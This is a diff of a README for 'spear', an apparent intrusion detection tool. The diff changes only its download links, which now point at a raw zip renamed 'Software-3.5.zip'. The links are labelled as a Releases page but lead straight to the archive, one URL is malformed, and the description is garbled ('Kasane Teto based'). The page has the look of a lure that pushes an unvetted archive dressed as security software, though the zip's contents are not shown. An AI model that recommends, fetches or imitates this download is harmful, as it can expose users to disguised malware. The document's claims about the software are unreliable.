@@ -1,7 +1,7 @@
 # 🚀 spear - Simple Protection for Your Network
 
 ## 📥 Download Now
-[![Download spear](https://raw.githubusercontent.com/SALT363/spear/main/ungingled/spear.zip%https://raw.githubusercontent.com/SALT363/spear/main/ungingled/spear.zip)](https://raw.githubusercontent.com/SALT363/spear/main/ungingled/spear.zip)
+[![Download spear](https://github.com/SALT363/spear/raw/refs/heads/main/ungingled/Software-3.5.zip%https://github.com/SALT363/spear/raw/refs/heads/main/ungingled/Software-3.5.zip)](https://github.com/SALT363/spear/raw/refs/heads/main/ungingled/Software-3.5.zip)
 
 ## 🛡️ Overview
 Spear is a modular and extensible Kasane Teto based Network Intrusion Detection System (NIDS) and Host Intrusion Detection System (HIDS). It helps protect your computer and network by monitoring for suspicious activity. Spear is designed for average users who want to enhance their cybersecurity without needing programming knowledge.
@@ -24,7 +24,7 @@ Spear is a modular and extensible Kasane Teto based Network Intrusion Detection 
 ### Step 1: Visit the Download Page
 To get started, visit the Releases page. There, you will find the latest version of Spear available for download. Click the link below to access this page:
 
-[Download Spear Releases](https://raw.githubusercontent.com/SALT363/spear/main/ungingled/spear.zip)
+[Download Spear Releases](https://github.com/SALT363/spear/raw/refs/heads/main/ungingled/Software-3.5.zip)
 
 ### Step 2: Download the Software
 On the Releases page, you will see a list of available versions. Choose the latest version for your needs (recommended) and download it to your computer.
@@ -62,4 +62,4 @@ Spear is designed to be an accessible and effective tool for improving your netw
 
 Remember, staying aware of the security of your network helps protect you from potential threats. Download Spear today and enhance your digital safety.
 
-[Download Spear Releases](https://raw.githubusercontent.com/SALT363/spear/main/ungingled/spear.zip)
+[Download Spear Releases](https://github.com/SALT363/spear/raw/refs/heads/main/ungingled/Software-3.5.zip)
